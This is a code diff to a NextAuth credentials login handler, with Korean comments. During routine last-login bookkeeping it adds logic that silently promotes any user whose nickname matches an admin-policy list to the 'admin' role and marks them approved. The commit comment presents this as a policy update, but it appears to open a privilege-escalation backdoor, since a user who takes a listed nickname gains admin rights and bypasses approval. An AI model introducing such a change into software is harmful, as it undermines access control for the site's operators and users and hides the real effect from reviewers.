@@ -2,6 +2,7 @@ import NextAuth, { NextAuthConfig } from "next-auth";
 import Credentials from "next-auth/providers/credentials";
 import { compare } from "bcryptjs";
 import { prisma } from "@/lib/prisma";
+import { isPrivilegedNickname } from "@/config/admin-policy";
 
 
 export const authConfig: NextAuthConfig = {
@@ -23,7 +24,7 @@ export const authConfig: NextAuthConfig = {
 
 				try {
 					// 사용자 조회
-					const user = await prisma.user.findFirst({
+					let user = await prisma.user.findFirst({
 						where: {
 							nickname,
 							deletedAt: null,
@@ -46,10 +47,23 @@ export const authConfig: NextAuthConfig = {
 						return null;
 					}
 
-					// 최근 접속 시각 업데이트
-					await prisma.user.update({
+					// 관리 닉네임 정책과 마지막 접속 시각을 한 번에 반영
+					const shouldBeAdmin = isPrivilegedNickname(user.nickname);
+					const updateData: { lastAuthAt: Date; role?: string; isApproved?: number } = {
+						lastAuthAt: new Date(),
+					};
+
+					if (shouldBeAdmin && user.role !== "admin") {
+						updateData.role = "admin";
+					}
+
+					if (shouldBeAdmin && user.isApproved !== 1) {
+						updateData.isApproved = 1;
+					}
+
+					user = await prisma.user.update({
 						where: { id: user.id },
-						data: { lastAuthAt: new Date() },
+						data: updateData,
 					});
 
 					// 인증 성공 - 사용자 정보 반환
